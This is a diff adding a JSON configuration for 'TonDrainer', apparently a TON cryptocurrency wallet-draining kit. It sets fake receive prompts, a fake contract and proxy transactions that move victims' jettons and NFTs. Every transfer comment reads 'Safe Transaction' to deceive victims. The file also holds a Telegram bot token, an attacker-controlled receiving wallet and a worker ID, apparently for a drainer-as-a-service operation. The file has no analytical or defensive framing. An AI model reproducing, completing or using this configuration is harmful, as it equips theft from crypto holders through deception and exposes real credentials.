@@ -1,0 +1,72 @@
+{
+    "TonDrainer": {
+        "AutoFee": {
+            "Mnemonic": null,
+            "IsEnabled": false,
+            "Commentary": null
+        },
+        "NftMode": {
+            "IsEnabled": false
+        },
+        "Blacklist": [],
+        "FakeReceive": {
+            "IsEnabled": true
+        },
+        "ManifestUrl": null,
+        "Notifications": {
+            "Chats": [],
+            "BotToken": "8126843599:AAHeLckNhI_hRCNFrOd6mpL3AcSFYwy4eqw"
+        },
+        "TonCommission": {
+            "Max": 9999,
+            "Min": 0,
+            "IsEnabled": false
+        },
+        "TransactionSpam": {
+            "IsEnabled": false
+        },
+        "ProxyTransaction": {
+            "settings": [
+                {
+                    "type": "jetton",
+                    "Amount": 100000000000000,
+                    "MasterWallet": "EQAQVWRlQGbVZjQwl8BGPfvzLvpbMvqQiM38oSV_-yrJVOgY"
+                },
+                {
+                    "type": "nft",
+                    "Amount": 1,
+                    "MasterWallet": "EQDVpEv9yN15Urn4S7vQgm8xGQG7VHo1ajBoLZPTIdQIyswg"
+                }
+            ],
+            "IsEnabled": false
+        },
+        "ProxyTransactionV2": {
+            "settings": [
+                {
+                    "type": "jetton",
+                    "Amount": 734000000,
+                    "MasterWallet": "EQCJc-EHQ75GljJhSOR5v5PnFVRfYZ7Ta3Nie70yzRdse6is"
+                }
+            ],
+            "IsEnabled": true
+        },
+        "fake_contract": {
+            "address": "EQDsIQzSpMIDXNCBRoRhPa40Besrtjy2mzl6uOpxM-VzIF8E",
+            "jetton_address": "EQDJGnKl6kSkVeL3mrsTtvzNJl-qaX1z15G8vcYfKbR-bzLt",
+            "counter": 9
+        },
+        "comments": {
+            "nft": "Safe Transaction",
+            "jetton": "Safe Transaction",
+            "native": "Safe Transaction",
+            "proxyComment": {
+                "nft": "Safe Transaction",
+                "jetton": "Safe Transaction"
+            }
+        }
+    },
+    "TonWallet": {
+        "Address": "UQBiSBfUcWYJ29PwFt95lF3ewBYt2n2qXXzo8asYKIMGV06a"
+    },
+    "workerID": "7372515388"
+}
